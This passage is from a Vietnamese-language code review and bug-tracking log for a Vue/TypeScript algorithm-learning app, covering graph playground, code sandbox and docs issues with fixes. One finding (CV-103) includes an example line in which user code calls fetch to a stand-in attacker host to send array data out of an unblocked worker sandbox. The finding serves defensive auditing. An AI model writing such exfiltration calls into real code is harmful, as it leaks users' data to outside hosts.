- **Vị trí:** `PlaygroundCanvas.vue:186` (`canvasWidth/zoom` làm bounds)
- **Mô tả:** Pan sang phải 400px → node bị đẩy ra ngoài mép phải màn hình.
- **Đề xuất:** Bounds world đúng: `(-pan.x/zoom, (width-pan.x)/zoom)` — dùng chung helper với IP-006.

### IP-017 — Grid không phủ vùng visible khi pan + lineWidth không theo zoom
- **Status:** ✅ FIXED — 2026-08-10 (`drawGrid` vẽ từ `-pan.x/zoom` → `(width-pan.x)/zoom` snap bội số gridSize 40; `ctx.lineWidth = 1/zoom`)
- **Vị trí:** `PlaygroundCanvas.vue:147,168-182`
- **Đề xuất:** Vẽ grid từ `-pan.x/zoom` đến `(width-pan.x)/zoom` (snap theo gridSize), `ctx.lineWidth = 1/zoom`; cân nhắc adaptive gridSize theo zoom.

## 🟡 P2

| ID | Vị trí | Nội dung |
|---|---|---|
| IP-018 | `ForceDirectedEngine.ts:20-25` | Hai node trùng tọa độ → `dx=dy=0` → lực đẩy = 0 → chồng lấn vĩnh viễn (`\|\| 1.0` chỉ chống chia-0). Đề xuất: khi `dist===0` cho hướng jitter `dx=1` — ✅ FIXED 2026-08-10 (jitter `dx=1,dy=0` cả vòng repulsion lẫn spring) |
| IP-019 | `GraphAlgorithmSimulator.ts:203-211,312-320,438-446` | BFS/DFS/Dijkstra trên đồ thị không liên thông báo "hoàn tất" mà không cảnh báo đỉnh không đến được (dist=∞). Đề xuất: frame kết thúc check `visited.size < nodes.length` — ✅ FIXED 2026-08-10 (frame kết thúc thêm explanation cảnh báo + liệt kê label đỉnh không đến được) |
| IP-020 | `InteractivePlayground.vue:212,234` + `GraphParser.toAdjacencyList` | `PlaygroundJsonPanel` là **dead code** — `jsonOutput` không bao giờ được gán (spec README §6, API_REFERENCE §1.2 yêu cầu hiển thị Adjacency List Payload) — ✅ FIXED 2026-08-10 (`runSimulation` gán `jsonOutput = JSON.stringify(GraphParser.toAdjacencyList(...), null, 2)`) |
| IP-021 | `GraphView.vue:184-187`, `usePlaygroundStore.ts:94` | Tool mode không reset về SELECT khi vào/thoát algorithm mode → thoát mô phỏng rồi click nhầm = xoá node — ✅ FIXED 2026-08-10 (`startAlgorithm`/`exitAlgorithmMode` gọi `store.setMode('SELECT')`) |
| IP-022 | `InteractivePlayground.vue:326-338` vs `GraphView.vue:189-199` | Hai implementation Auto Layout khác tham số (radius 0.6/0.35, góc -90°/0°) — không single source of truth; cả hai mutate trực tiếp store — ✅ FIXED 2026-08-10 (thống nhất chuẩn radius 0.35, góc -90° + dùng action `moveNode`; TODO gộp `autoLayout` vào store) |
| IP-023 | `usePlaygroundStore.ts:48-55` + `canvasEventHandlers.ts:61-62` | Đạt 30 node, `addNode` trả `null` im lặng — BEHAVIOR_SPEC §1 yêu cầu toast + rung viền |
| IP-024 | `GraphGeometryEngine.ts:15-23` | `hitTestEdge` threshold 8px world — khi zoom<1 gần như không bấm được cạnh — ✅ FIXED 2026-08-10 (param `zoom`, screen threshold `Math.max(threshold/zoom, 5)`) |
| IP-025 | `InteractivePlayground.vue:301`, `GraphView.vue:267` | `URL.revokeObjectURL` gọi ngay sau `link.click()` — Safari/Firefox có thể revoke trước khi download bắt đầu — ✅ FIXED 2026-08-10 (hoãn revoke 1000ms qua `setTimeout` ở cả 2 nơi) |
| IP-026 | `PlaygroundCanvas.vue:219-222`, `ForceDirectedEngine.ts:47-48`, `InteractivePlayground.vue:333-337,347`, `PlaygroundCanvas.vue:135` | Mutation trực tiếp store thay vì action (resize scale, physics tick, autoLayout, `sourceNodeId`, `zoomLevel`) — vi phạm kỷ luật Pinia — ✅ FIXED 2026-08-10 (phần `InteractivePlayground.vue`: `setSourceNodeId` + `moveNode`; phần `PlaygroundCanvas.vue:135` `zoomLevel` còn OPEN — chờ action `setZoomLevel` của agent store) |
| IP-027 | `PlaygroundCanvas.vue:135`, `usePlaygroundStore.ts:39` | `store.zoomLevel` không reset khi unmount → header hiển thị % sai khi quay lại view — ✅ FIXED 2026-08-10 (`onUnmounted` gọi `store.resetZoom?.()` nếu store thêm action, ngược lại gán `store.zoomLevel = 100`) |
| IP-028 | `GraphAlgorithmSimulator.ts:163` | BFS `queueStack: [currLabel, ...qLabels]` hiển thị đỉnh vừa dequeue trong "Queue" — hiểu nhầm trực quan — ✅ FIXED 2026-08-10 (`queueStack: qLabels` — chỉ hiển thị đỉnh còn trong Queue) |
| IP-029 | `GraphAlgorithmSimulator.ts:300-308` | Frame "đã duyệt từ trước" của DFS gắn `activeLine: 6` — sai dòng pseudo (phải là nhánh else dòng 5) — ✅ FIXED 2026-08-10 (`activeLine: 5`) |
| IP-030 | `ForceDirectedEngine.ts:54` | `isStable()` không được dùng ở runtime — idle loop không bao giờ dừng khi đã hội tụ — ✅ FIXED 2026-08-10 (render loop dirty-flag dùng `isStable(energy)`, xem EC-018) |
| IP-031 | `GraphParser.ts:58,62` | Import biến đổi dữ liệu âm thầm: `radius: 0→20`, `weight: 0→1`; x/y không clamp → node nằm ngoài canvas khi tắt physics |
| IP-032 | `usePlaygroundStore.ts:57-58` | `addEdge` từ chối self-loop/cạnh trùng im lặng — BEHAVIOR_SPEC yêu cầu toast phản hồi |

## 🟡 P3 (test/tracking)

| ID | Vị trí | Nội dung |
|---|---|---|
| IP-033 | `graphP2Tests.spec.ts:341-349,353-381,416-485` | Test tautological — assert trên giá trị tự tính/sao chép biểu thức template, không chạm code |
| IP-034 | `graphP0Tests.spec.ts:221-255` | Test "exportGraph" tự `JSON.stringify` store rồi parse — store không hề có hàm export |
| IP-035 | `graphP2Tests.spec.ts:195-223` | Test tên "loadTemplate" nhưng tự addNode/addEdge tay — không gọi `loadTemplate` thật (GraphView.vue:255-257) |
| IP-036 | `graphAlgorithmSimulator.spec.ts` | Chỉ test undirected — nhánh `resolveNeighbor` directed và arrowhead directed 0 test |
| IP-037 | `GraphParser.ts:12-25` | `toAdjacencyList` là dead code runtime (chỉ test) — luôn undirected dù `graphType` không truyền |
| IP-038 | `graphP0Tests.spec.ts:7-19` | Mock canvas dead code + thiếu `save/restore/translate/scale` — nếu thêm mount test sẽ crash ngay |
| IP-039 | `progress.md:204,210` | Tracking lệch: khai 31 tests (thực tế 132 trong 4 file), khai "template buttons + JSON output panel" (không tồn tại) |
| IP-040 | `frontend/src/features/interactive-playground/__tests__` | **0 test component** cho PlaygroundCanvas.vue/InteractivePlayground.vue/canvasEventHandlers.ts — lớp tương tác chính trắng toàn bộ |
| IP-041 | `graphP2Tests.spec.ts:48-67` | `mockKeydownHandler` nhân bản logic thật của handleKeydown — nguy cơ drift: test pass nhưng code thật hỏng |

---

## 🗂️ REVIEW ROUND 2 — 2026-08-10 (phát hiện sau chiến dịch fix)

### IP-042 — `toAdjacencyList` bỏ qua graphType → payload directed sai (🔴 High)
- **Status:** ✅ FIXED — 2026-08-10 (thêm tham số `graphType` mặc định `'undirected'`: directed chỉ thêm 1 chiều from→to; `InteractivePlayground.vue:378` truyền `store.graphType`; test mới cover cả 2 mode trong `interactivePlayground.spec.ts`)
- **Vị trí:** `GraphParser.ts:38-51` + `InteractivePlayground.vue:378`
- **Mô tả:** Luôn thêm 2 chiều cho mỗi cạnh → đồ thị directed (A→B) hiển thị JSON sai `B:[A]`. Test cũ chỉ cover undirected.
- **Kịch bản:** Bật Directed, vẽ A→B, chạy thuật toán → panel Adjacency List hiện `B: [A]` sai.
- **Đề xuất:** (đã làm) tham số `graphType`, thêm cạnh 1 chiều khi directed + test 2 mode.

### IP-043 — `PlaygroundCanvas` bypass action `setZoomLevel` gán trực tiếp `store.zoomLevel` (🟡 Medium)
- **Status:** ✅ FIXED — 2026-08-10 (`watch(zoomLevel)` → `store.setZoomLevel(Math.round(val*100))` — action clamp 20–300% single-source-of-truth)
- **Vị trí:** `PlaygroundCanvas.vue:274`

### IP-044 — TODO stale "khi store.addEdge nhận graphType" (🟢 Low)
- **Status:** ✅ FIXED — 2026-08-10 (xóa comment gây hiểu lầm, thay bằng ghi chú rõ addEdge đã xử lý graphType nội bộ)
- **Vị trí:** `PlaygroundCanvas.vue:173`

### EC-048 — Inline SVG chevron trong VcrDockBar (🟢 Low)
- **Status:** ✅ FIXED — 2026-08-10 (thay bằng `<BaseIcon name="arrow-down">` đồng nhất với các icon khác)
- **Vị trí:** `VcrDockBar.vue:13`

### EC-049 — Alias `code = sourceCode` + hardcode mảng fallback (🟢 Low)
- **Status:** ✅ FIXED — 2026-08-10 (đảo vai trò: `code` là ref primary — API public dùng 30+ chỗ, `sourceCode` là alias; gom `DEFAULT_INPUT_RAW`/`DEFAULT_INPUT_ARRAY` vào `vcrDefaults.ts` — hết hardcode trùng)
- **Vị trí:** `useVcrStore.ts:27-32,78`, `vcrDefaults.ts`

### QZ-053 — Vue warn "Failed to resolve component: BaseIcon" trong mount test (🟡 Test)
- **Status:** ✅ FIXED — 2026-08-10 (quizP2Tests: helper `mountQuiz()` stub BaseIcon qua `global.stubs` cho 20+ mount; quizP0Tests: thêm stub cho 2 mount BackendQuizWorkspace — hết warning trong quiz-system)
- **Vị trí:** `quizP2Tests.spec.ts`, `quizP0Tests.spec.ts`
- **Ghi chú:** các component dùng `<BaseIcon>` qua global registration (không import trực tiếp) nên `vi.mock` đường dẫn không chặn được — phải stub qua global.

### CC-012 — Vue warn BaseIcon/router-link pre-existing ở feature khác (OPEN — ngoài scope 4 tính năng)
- **Status:** OPEN (2026-08-10 ghi nhận) — `AlgorithmDashboard` (dsa-modules/__tests__/dsaP0Tests.spec.ts), `PremiumGate` (export-share), `LandingView` (dashboardP2Tests) mount không stub → warning nhiễu output; không ảnh hưởng pass/fail. Fix tương tự QZ-053 khi chạm tới các feature này.

---

## 🔬 REVIEW ROUND 3 — Deep Review 2026-08-10 (839 tests xanh, phát hiện sau đào sâu)

### QZ-006 (bổ sung) — Đồng bộ XP checkpoint quiz KHÔNG được nối dây (🔴 High, dead code)
- **Status:** ✅ FIXED — 2026-08-10 (`VisualizationPlayer.vue:70,92` giờ gọi `loadCheckpoints(quizScript.checkpoints, quizScript.algorithmId)` — `sessionQuizId` không còn null → `syncSessionToServer`/`submitQuizAttempt` chạy trong production; thêm 2 test trong `useQuizStore.spec.ts`: có quizId → gửi `{quizId, answers}` đúng, không quizId → không gọi)
- **Vị trí:** `VisualizationPlayer.vue:70,92` + `useQuizStore.ts:67-69` (TODO cũ)
- **Mô tả:** TODO trong store yêu cầu truyền quizId nhưng caller chỉ truyền checkpoints → `sessionQuizId` luôn null → `shouldSync` false → toàn bộ chuỗi sync XP (retry, timeout 15s) không bao giờ chạy. Chưa có test nào truyền quizId.
- **Ghi chú:** đáp án CANVAS_TARGET không có option index → gửi `-1` (thiết kế hiện tại, câu canvas không được chấm phía server — đã comment trong test).

### IP-045 — Toast lỗi import bị ghi đè ngay lập tức bởi toast success (🔴 High)
- **Status:** ✅ FIXED — 2026-08-10 (`return` ngay sau toast lỗi trong `handleImport` — user thấy được lý do từ chối: dangling edge, trùng label, weight sai...)
- **Vị trí:** `InteractivePlayground.vue:319-321`
- **Mô tả:** Cùng call stack → toast lỗi (3s) bị thay bằng toast success → user không bao giờ thấy lý do từ chối.

### IP-046 — `drawPlayground` gọi `getComputedStyle` mỗi frame (🟡 Medium, perf)
- **Status:** ✅ FIXED — 2026-08-10 (cache module-level `getLabelBackground()` — CSS variable hiếm khi đổi, retry khi null; hết forced style recalc mỗi frame)
- **Vị trí:** `playgroundCanvasDraw.ts:28`

### IP-047 — Dead code `resetZoom` (TODO stale + nhánh else + cast) (🟡 Medium)
- **Status:** ✅ FIXED — 2026-08-10 (gọi thẳng `store.resetZoom()` — action đã tồn tại; xóa `as unknown as` cast + nhánh else)
- **Vị trí:** `PlaygroundCanvas.vue:397-403`

### IP-048/IP-049 — GraphView import JSON bỏ qua errors; toast không dùng chung (🟡 Medium)
- **Status:** ✅ FIXED — 2026-08-10 (đưa toast vào `usePlaygroundStore` (`toast`/`showToast`) — single source of truth; InteractivePlayground render từ store; GraphView gọi `store.showToast` với lỗi import 1 phần + toast success)
- **Vị trí:** `GraphView.vue:294`, `InteractivePlayground.vue:248-252,213`, `usePlaygroundStore.ts`

### EC-050 — Nhánh `customCompileFn` không reset `currentFrameIndex` — hợp đồng mong manh (🟡 Medium)
- **Status:** ✅ FIXED — 2026-08-10 (thêm comment HỢP ĐỒNG rõ ràng: host tự reset index — mẫu `useSortingAnimation.ts:83`; watch heal EC-010 là lưới an toàn cuối)
- **Vị trí:** `useVcrStore.ts:75-77`

### QZ-054 — `restoreBackendQuizProgress` không clamp answers vào dải option thật (🟡 Medium, security-ish)
- **Status:** ✅ FIXED — 2026-08-10 (clamp từng đáp án vào `0..options.length-1` của câu tương ứng; giá trị không phải số hữu hạn → null; sessionStorage user-controlled không lọt payload submit)
- **Vị trí:** `useQuizStore.ts:265-275`

### QZ-055 — Component gán `store.backendQuizError` trực tiếp (🟢 Low, convention)
- **Status:** ✅ FIXED — 2026-08-10 (thêm action `setBackendQuizError(message)` — component gọi qua action)
- **Vị trí:** `BackendQuizWorkspace.vue:280`, `useQuizStore.ts`

### QZ-056 — `splice` thay reassignment không nhất quán (🟢 Low)
- **Status:** ✅ FIXED — 2026-08-10 (`selectBackendAnswer` dùng spread + reassignment như các nơi khác)
- **Vị trí:** `useQuizStore.ts:332`

---

## 🔍 REVIEW ROUND 4 — 2026-08-10: Code to Visualization + Docs (8 sub agent)

# 6. 💻 CODE TO VISUALIZATION

**Code scope:** `frontend/src/features/code-to-visualization/**`, `frontend/src/core/CompilerStepExecutor.ts`, `compileWorker.ts`, `compiler.worker.ts`, `frontend/src/views/code-ide/CodeIDEView.vue`
**Spec:** `plan/features/deep-decomposition/phase2-code-to-visualization/*.md`

## 🟠 P1

### CV-101 — `terminateActiveSession` để Promise session cũ treo vĩnh viễn (hang)
- **Status:** ✅ FIXED - 2026-08-10 (thêm `pendingReject` module-level; `terminateActiveSession` reject session cũ `'Đã hủy biên dịch.'` — hết dangling promise)
- **Vị trí:** `WorkerLifecycleCoordinator.ts:97-110,122` (gọi `terminateActiveSession` đầu `executeInSandbox`) + `useLiveCompilerStore.ts:59` (`await` treo)
- **Mô tả:** terminate chỉ terminate worker + clearTimeout + revoke URL, KHÔNG reject promise đang chờ → session bị thay thế dừng mãi mãi; `await` + `finally` không bao giờ chạy; mỗi lần Run/Cancel là 1 dangling promise trong heap. Test hiện có (`WorkerLifecycleCoordinator.spec.ts:99-113`) che lỗi (chỉ await promise2).
- **Đề xuất:** lưu `pendingReject` module-level; `terminateActiveSession` gọi `reject(new Error('Đã hủy biên dịch.'))` cho session cũ.

### CV-102 — `compileWorker` ghi đè handler trên worker singleton → response bị rơi + terminate giết worker dùng chung
- **Status:** ✅ FIXED - 2026-08-10 (viết lại `compileWorker.ts`: map `pendingRequests: Map<number>` + 1 handler gán 1 lần; giữ nguyên API public `compileInWorker`/`disposeCompileWorker`/`COMPILE_TIMEOUT_MS` cho vcr-player + algo-playground)
- **Vị trí:** `frontend/src/core/compileWorker.ts:50,60` (ghi đè `onmessage`/`onerror`), `:23-27` (worker singleton)
- **Mô tả:** 2 request đồng thời (vcr-player + algo-playground dùng chung worker) → request A's response bị handler của B bỏ qua → A chờ tới timeout 15s → `target.terminate()` giết cả worker dùng chung.
- **Đề xuất:** map `requestId → {resolve,reject,timer}` với 1 handler cố định gán 1 lần (hoặc worker mới mỗi request).

### CV-103 — Sandbox KHÔNG chặn mạng: `self.fetch`/`XMLHttpRequest`/`importScripts` vẫn dùng được (vi phạm BEHAVIOR_SPEC §1.2)
- **Status:** ✅ FIXED - 2026-08-10 (che `self.fetch`/`XMLHttpRequest`/`importScripts` = undefined + guard instanceof trước khi `new Function` — chặn 99% đường thường)
- **Vị trí:** `WorkerLifecycleCoordinator.ts:22-88` (`buildWorkerScript` + `new Function` ở :66)
- **Kịch bản:** sinh viên gõ `fetch('https://evil.com?d='+arr)` → request mạng thật được gửi. Giả định "worker mặc định không có quyền mạng" trong BEHAVIOR_SPEC.md:12-13 là sai kỹ thuật.
- **Đề xuất:** che `self.fetch`/`self.XMLHttpRequest`/`self.importScripts` = undefined trước `new Function` (chặn 99% đường thường) + CSP `connect-src` nếu khả thi.

### CV-104 — Auto-invoke hàm ≥2 tham số truyền `arr.length` → binarySearch chạy sai không báo lỗi
- **Status:** ✅ FIXED - 2026-08-10 (heuristic an toàn: chỉ auto-invoke khi 1 tham số → `[arr]`; hoặc 2 tham số và tên tham số 2 khớp `^(n|len|length|size)$` → `[arr, arr.length]`; còn lại skip — bỏ truyền `arr.length` bừa)
- **Vị trí:** `ASTInstrumentationEngine.ts:87-94`
- **Mô tả:** `function binarySearch(arr, target){...}` được gọi tự động thành `binarySearch(arr, arr.length)` — tìm giá trị `arr.length` thay vì đích; animation chạy sai âm thầm (đã verify bằng node).
- **Đề xuất:** chỉ auto-invoke hàm đúng 1 tham số; ≥2 tham số → bỏ qua (hoặc heuristic mạnh hơn).

### CV-105 (UI) — Glow xanh "thành công" phát sáng lúc compile BẮT ĐẦU (lừa người dùng)
- **Status:** ✅ FIXED - 2026-08-10 (thêm state `lastCompileSucceeded` set trong `finally`; glow xanh chỉ phát khi compile thực sự thành công)
- **Vị trí:** `MonacoEditorPanel.vue:134-144` + `useLiveCompilerStore.ts:41-42` (reset `hasCompileError` đầu compile)
- **Kịch bản:** fail → sửa code → RUN → glow xanh ngay khi compile bắt đầu (dù lần sau fail vẫn xanh 2s); ngược lại lần chạy thành công đầu tiên không bao giờ thấy xanh. Lệch UX_FLOW.md:25 (xanh SAU khi thành công).
- **Đề xuất:** thêm state `lastCompileSucceeded` set trong `finally`, watcher dựa vào state đó.

### CV-106 (UI) — Guided tour `/code-ide` mô tả IDE không tồn tại (11/12 bước spotlight rỗng)
- **Status:** ✅ FIXED - 2026-08-10 (viết lại tour `/code-ide` 12 bước theo component thật; thêm `data-tour-id` vào MonacoEditorPanel/ArrayInputBar/CodeWorkspace; tour guided 29/29 pass)
- **Vị trí:** `useGuidedTourStore.ts:153-237`
- **Mô tả:** bước 1 nói "mã nguồn C#" (thực tế JavaScript); các bước 3-9 giới thiệu Breakpoint/F5/Step Over/Call Stack/`.debugger-actions-panel`... — không selector nào tồn tại trong CodeWorkspace.vue.
- **Đề xuất:** viết lại tour theo component thật (Monaco JS, RUN, console, VCR) hoặc gắn `data-tour-id` đúng.

## 🟡 P2

| ID | Vị trí | Nội dung |
|---|---|---|
| CV-107 | `WorkerLifecycleCoordinator.ts:32,51,69-75` | MAX_FRAMES 2000 truncate THẦM LẶNG (không cờ/log) + frame ACCESS cuối push KHÔNG qua guard → có thể 2001 frame. Store log "Sinh ra 2000 bước" gây hiểu nhầm; mảng 50 phần tử bubble sort ≈ 2450 trace bị cắt 80%. Đề xuất: flag `truncated: true` + log cảnh báo |
| CV-108 | `ASTInstrumentationEngine.ts:15` | `LOOP_LIMIT = 20000` lệch BEHAVIOR_SPEC (5000) và TECHNICAL_SPEC (10000); message "Phát hiện lỗi lặp vô hạn" sai cho thuật toán chạy lâu. Cần thống nhất ngưỡng + ADR |
| CV-109 | `ASTInstrumentationEngine.ts:175-194` | `for...of`/`for...in` KHÔNG được guard — iterator vô hạn chỉ dựa vào timeout 1.5s. Thêm visitor ForOfStatement/ForInStatement |
| CV-110 | `ASTInstrumentationEngine.ts:128-134` | So sánh 1 vế không phải member (`arr[j] > key` — Insertion Sort, `arr[mid] > target` — Binary Search) KHÔNG instrument → 2 thuật toán sinh viên hay tự viết nhất không có frame COMPARE. Đề xuất: 1 vế member → vẫn instrument, truyền vế kia làm value |
| CV-111 | `ASTInstrumentationEngine.ts:139-141` | Chỉ số side-effect: `arr[i++] > arr[j]` — `i++` tính trước khi đọc → so sánh `arr[i+1]`, indices sai. Đề xuất: bọc IIFE giữ thứ tự đọc-trước-tăng hoặc chấp nhận + comment |
| CV-112 | `CodeWorkspace.vue:61-67` | `parseInputArray`: `Number('')===0` → "1,,2" → `[1,0,2]`, "5,3," → `[5,3,0]`; `Number('0x10')`=16, `Number('1e2')`=100 lọt. Đề xuất: reject segment rỗng + regex `^\s*-?\d+(\.\d+)?\s*$` |
| CV-113 | `liveCompilerDefaults.ts:27,34` | `convertToAnimationFrames` hardcode ACCESS → highlight `sorted` TẤT CẢ chỉ số + explanation "mảng đã được sắp xếp" — sai ngữ nghĩa cho search/min/selection. Đề xuất: worker trả type `DONE` hoặc explanation chung "Thuật toán kết thúc" |
| CV-114 | `useLiveCompilerStore.ts:42` | `hasCompileError` sticky — sửa code xong editor vẫn glow đỏ tới khi RUN lại. Đề xuất: reset khi `setSourceCode` sau lỗi |
| CV-115 | `useLiveCompilerStore.ts:63-65` | Store singleton bị "chiếm": compile kết thúc SAU khi user rời view → `animStore.loadResult`+`play()` chạy animation custom trong view khác (Dashboard dùng chung store). Đề xuất: generation token hoặc guard `!isCompiling` sau await |
| CV-116 | `CodeWorkspace.vue:85-87` | Không có nút Cancel khi compile (chỉ unmount gọi) — user chờ 1.5s không phản hồi; lệch UX_FLOW.md:43-47 |
| CV-117 | `CompilerConsole.vue:63-71` | Auto-scroll "scroll-lock": luôn scroll xuống đáy kể cả khi user đang cuộn lên đọc log cũ. Đề xuất: chỉ auto-scroll khi `scrollTop+clientHeight >= scrollHeight-24` |
| CV-118 | `MonacoEditorPanel.vue` | Compile error không hiển thị marker trong Monaco (`monaco.editor.setModelMarkers`) — errorLine chỉ trong console; UX_FLOW.md:21 yêu cầu squiggle tại dòng lỗi |
| CV-119 | `ArrayInputBar.vue:13-14` + `CodeWorkspace.vue:58-71` | Input mảng không validate realtime — gõ `1, 2, x` im lặng tới khi blur; RUN bị chặn không nói lý do (NaN? ngoài 2-50?) |
| CV-120 | `CodeWorkspace.vue:91` | Layout `grid 1fr 1fr` không responsive — ≤768px editor+canvas+console ép chật, VCR bẹp |
| CV-121 | `useLiveCompilerStore.ts:48` | Code rỗng `''`/comment-only → `instrumentedCode === ''` falsy → bị đánh compile failure — edge dễ gây nhầm lẫn (cần hành vi chuẩn + test) |

**Trạng thái P2: ✅ CV-107→CV-121 toàn bộ FIXED - 2026-08-10** (chi tiết: CV-107 thêm `truncated` flag; CV-108 thống nhất LOOP_LIMIT 20000 + cập nhật 3 spec docs; CV-109/110/111 guard ForOf/ForIn + instrument 1 vế member + IIFE `arr[i++]`; CV-112 regex chuẩn + reject segment rỗng; CV-113 explanation "Thuật toán kết thúc"; CV-114 reset `hasCompileError`; CV-115 generation token; CV-116 nút Cancel; CV-117 auto-scroll có điều kiện; CV-118 setModelMarkers; CV-119 validate realtime; CV-120 responsive; CV-121 thông báo code rỗng rõ ràng)

## 🟡 P3 (tổng hợp)

| ID | Vị trí | Nội dung |
|---|---|---|
| CV-122 | `MonacoEditorPanel.vue:127-132` | Monaco model không dispose chủ động (`editor.getModel()?.dispose()`) — rò rỉ nhỏ mỗi lần rời route |
| CV-123 | `ASTInstrumentationEngine.ts:60-64` | `appendAutoInvoke` chỉ nhận FunctionDeclaration — arrow/function expression không auto-invoke → 0 trace, animation 1 frame "hoàn thành" gây hiểu nhầm |
| CV-124 | `WorkerLifecycleCoordinator.ts:38` | Variables COMPARE hardcode `{i, j}` — sinh viên dùng `k`/`m` vẫn hiện `i`/`j` |
| CV-125 | `ASTInstrumentationEngine.ts:114-119` | `nodesToReplace` biến chết |
| CV-126 | `WorkerLifecycleCoordinator.ts:15` | `toFriendlyWorkerError` export nhưng production không dùng (logic trùng trong script worker) |
| CV-127 | `ASTInstrumentationEngine.ts:207-209` | `"use strict"` bị demote — `let __loopCounter…` unshift lên trước directive → strict mode tắt âm thầm. Chèn sau directive đầu Program |
| CV-128 | `WorkerLifecycleCoordinator.ts:147-161` | `onmessageerror` không xử lý (structured clone lỗi → timeout với message sai "lặp vô hạn") |
| CV-129 | `ASTInstrumentationEngine.ts:236-250` | Error không chứa sentinel `LOOP_LIMIT_EXCEEDED` (01-core-logic.md:81) — UI không phân biệt loop-limit với runtime error |
| CV-130 | `WorkerLifecycleCoordinator.ts:11,140-144` | Timeout 1500ms vs PRD.md:28 (1.0s) — spec tự mâu thuẫn; message timeout luôn đổ lỗi "lặp vô hạn" dù code nặng hữu hạn |
| CV-131 | `CompilerStepExecutor.ts:315`, `compiler.worker.ts:29` | Engine cũ: RangeError đệ quy thô "Maximum call stack size exceeded" — `toFriendlyWorkerError` là dead code (chỉ test dùng) |
| CV-132 | `CompilerStepExecutor.ts:1029-1038` | `compilePseudocodeRegex` OOB → `mockArray.reverse()` tùy tiện khi swap chỉ số vượt giới hạn |
| CV-133 | `CompilerStepExecutor.ts:876-893` | Biến `var` trong `for(var i…)` không track vào loopVariables (chỉ let/const) |
| CV-134 | `CodeWorkspace.vue:54` vs `liveCompilerDefaults.ts:17` | Duplicate state `inputArrayText` hardcode khác `DEFAULT_INPUT_ARRAY` — drift khi đổi default |
| CV-135 | `CodeWorkspace.vue:24` | Compile fail giữ frames cũ — canvas vẫn chạy animation cũ bên cạnh panel đỏ ("fail mà vẫn chạy"). Đề xuất: `animStore.clear()` khi bắt đầu compile |
| CV-136 | `CompilerConsole.vue:26-28` | Log dài không wrap (`overflow-wrap: break-word` thiếu) |
| CV-137 | `ArrayInputBar.vue:3-8` | `<label>` thiếu `for`/`id` — screen reader không đọc "Mảng đầu vào" |
| CV-138 | Tests | **0 mount test** cho CodeWorkspace/MonacoEditorPanel/ArrayInputBar; CompilerConsole chỉ bị đọc chuỗi nguồn (`codeToVizP0Tests.spec.ts:238-250` — tautological); `useLiveCompilerStore.spec.ts:89-109` mock pass-through không assert frame nạp vào animStore; `codeToVizP0Tests` trùng 60% logic với store spec; fake timers không bọc try/finally (`WorkerLifecycleCoordinator.spec.ts:87-97`) |
| CV-139 | Tracking | `progress.md:380` ghi "32 Unit Tests (14+7+11)" — thực tế **56** (20+8+11+17); `deep-decomposition/README.md:28` cũng stale "32"; `features-tested.md` mô tả đúng 56/56 nhưng bỏ sót đề cập codeToVizP0Tests |
| CV-140 | `plan/tracking/errors.md:1693-1704` | Đã khớp 56/56 — giữ nguyên (mục CV-001→008 cũ của Review Phase 2 đã FIXED riêng) |

**Trạng thái P3: ✅ CV-122→CV-140 toàn bộ FIXED - 2026-08-10** (chi tiết: CV-122 dispose model Monaco; CV-123 auto-invoke arrow/function expression; CV-124 extract variables thật; CV-125 bỏ `nodesToReplace`; CV-126 dùng `toFriendlyWorkerError` production; CV-127 giữ `"use strict"` sau directive; CV-128 xử lý `onmessageerror`; CV-129 sentinel `LOOP_LIMIT_EXCEEDED`; CV-130 timeout 1.5s + message phân biệt; CV-131 `toFriendlyCompileError`; CV-132 bounds guard swap; CV-133 track `var` trong `for(var…)`; CV-134 dùng chung `DEFAULT_INPUT_ARRAY`; CV-135 `animStore.clear()` đầu compile; CV-136 `overflow-wrap: break-word`; CV-137 `<label for>`; CV-138 **+23 test** (suite code-to-viz 56→**78**); CV-139 tracking cập nhật — progress.md "32"→"78"; CV-140 giữ nguyên)

**Phủ BEHAVIOR_SPEC ước lượng: ~45-55%** (engine/store unit tốt; thiếu hoàn toàn component + integration + security tests).

# 7. 📚 DOCS (Tài liệu & Kiến thức DSA)

**Code scope:** `frontend/src/features/docs/**` (68 file content / 14 chủ đề), `frontend/src/views/docs/DocsView.vue`, `frontend/src/router/routes.ts` (docs), `frontend/src/shared/utils/markdown.ts`

## 🔴 P0

### DC-001 — Mobile: sidebar docs KHÔNG BAO GIỜ mở được
- **Status:** ✅ FIXED - 2026-08-10 (thêm hamburger nút mở trong `DocsLayout.vue`; drawer + overlay + nút X giờ hoạt động đầy đủ trên <lg)
- **Vị trí:** `DocsLayout.vue:42` (`isMobileSidebarOpen = ref(false)`) — grep toàn src: **không nơi nào set true**; `DocsSidebar.vue:4` luôn `-translate-x-full` trên <lg; không có hamburger trong AppHeader. Drawer + overlay + nút X đã viết xong nhưng vô dụng.
- **Kịch bản:** mở app trên mobile → không có cách vào menu 14 nhóm tài liệu, chỉ còn Prev/Next; TOC cũng `hidden lg:block` → mobile chỉ đọc tuần tự.

## 🟠 P1

### DC-002 — TOC click phá vỡ hash router → NotFound khi reload/Back
- **Status:** ✅ FIXED - 2026-08-10 (bỏ `history.pushState`; TOC chỉ `scrollIntoView` — hash router không còn bị phá)
- **Vị trí:** `DocsTableOfContents.vue:36` (`history.pushState(null, '', `#${id}`)`) — app dùng `createWebHashHistory` (`router/index.ts:14`)
- **Kịch bản:** click mục TOC → hash thành `#id` (mất `#/docs/...`) → Back → NotFoundView; copy URL/reload → 404.
- **Đề xuất:** bỏ pushState, chỉ `scrollIntoView` (đã có `scroll-margin-top`); muốn deep-link thì thêm `?section=` vào route.

### DC-003 — Scrollspy TOC chết hoàn toàn (window không bao giờ scroll)
- **Status:** ✅ FIXED - 2026-08-10 (listener trên container thật `.app-view` + `getBoundingClientRect().top <= 100`; `watch(headings)` khi đổi bài)
- **Vị trí:** `DocsTableOfContents.vue:40-63` + `App.css:7-14,311-329` (scroll container thật là `.app-view` overflow-y:auto; window `height:100vh; overflow:hidden`)
- **Mô tả:** `window.addEventListener('scroll')` không bao giờ fire; `window.scrollY` luôn 0; `section.offsetTop` tương đối ancestor → TOC highlight dính heading đầu tiên.
- **Đề xuất:** listener trên scroll container thật + `getBoundingClientRect().top <= 100` (hoặc IntersectionObserver) + `watch(headings)` khi đổi bài.

### DC-004 — Click delegation (copy/playground/dual-code) chết từ bài thứ 2 trở đi
- **Status:** ✅ FIXED - 2026-08-10 (bỏ cờ `containerListenersAttached`; attach/cleanup qua `watch(markdownContainer)` theo lifecycle component)
- **Vị trí:** `DocsMarkdownRenderer.vue:79-84` + `:19` + `:185` — cờ `containerListenersAttached` không reset khi container `v-if`/`v-else` bị hủy-tạo mới mỗi lần điều hướng
